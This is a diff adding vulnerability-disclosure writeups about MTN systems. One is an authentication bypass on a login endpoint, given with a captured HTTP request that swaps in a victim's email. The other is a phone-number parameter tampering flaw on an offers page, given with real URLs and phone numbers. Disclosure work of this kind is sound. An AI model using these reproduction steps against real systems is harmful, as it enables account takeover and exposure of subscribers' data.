@@ -238,5 +238,90 @@ You should first check if the user that submits the request isn't tampering and 
 ### Impact
 Lead to disclose all of victim's new custom tags without any interaction with victim.
 
+# 2.BOLA
+### Description
+When an invalid email address/password is entered, the Web Application will not authenticate the user. But nevertheless, it is conceivable for an attacker to get around authentication and log in as anyone else, leading to Complete Account Takeover.
+### Steps To Reproduce:
+Create Two Test Account (Attacker & Victim)
 
+Using attacker's account, login at ███████
 
+Capture request with Burp.
+
+Without sending request to "Burp Repeater", modify attacker's email to victim's email. For example REDACTED+██████ to REDACTED+█████.
+
+Change the param value:false, to value:true, and click send.
+
+Notice, attacker has successfully bypassed the authentication to login as the victim without any interaction.
+
+### Supporting Material/References:
+### Request
+Code
+POST /app/login HTTP/1.1
+Host: mtnmobad.mtnbusiness.com.ng
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36
+....snip....
+Connection: close
+{
+	"params":{
+		"updates":[
+		{
+			"param":"user",
+			"value":{
+				"userEmail":"REDACTED+██████",
+				"userPassword":"#######"
+				},
+				"op":"a"
+				},
+				{
+					"param":"gateway",
+					"value":true,
+					"op":"a"
+					}
+					]
+### Response
+Code
+HTTP/1.1 200 OK
+Server: nginx
+....snip....
+{
+	"error":false,
+	"response":{
+		"id":"/703",
+	"name":"Victim ******",
+	"type":"Account",
+	"level":0,
+	"notes":{
+		},
+
+### Impact
+Supposing there are 100,000 users available, a malicious actor will enumerate all 100,000 emails for all users to achieve a mass account takeover. Additionally, an attacker can lockdown an account, delete an account, change account info, and perform large data leaks.
+
+# 3.Horizontal Privilege Escalation
+### Description-
+access controls are broken, unauthorized users may gain access to sensitive information, modify data, or perform actions that they shouldn't be allowed to. This can lead to various security risks, including data breaches, unauthorized privilege escalation, and other malicious activities.
+### Steps to Reproduce:-
+STEP 1:-
+Go to https://mtn.ng/offers/
+nter your number and click on Submit Button
+Click on Ok
+
+STEP 2:
+Enter the OTP code sent to your number
+click on Validate
+
+STEP 3:
+MTN offer dashboard will automatically display
+https://mtn.ng/offers/list?phone=2348160817474
+
+STEP 4:
+I changed the number that i logged in with my alternative number and it works successfully
+https://mtn.ng/offers/list?phone=2349138557692
+In this situation an attacker change the phone number to number of his choice
+Example:
+If you click on this link you will have access to my MTN number without an authentication
+https://mtn.ng/offers/list?phone=2349138557692
+
+### Impact
+This vulnerability allow an attacker to access any MTN number in Nigeria and allow threat actors to subscribe data or airtime to the victims.
+It can also allow attackers to send messages of their choice to their targeted victims and the victims might think that the message come from MTN.
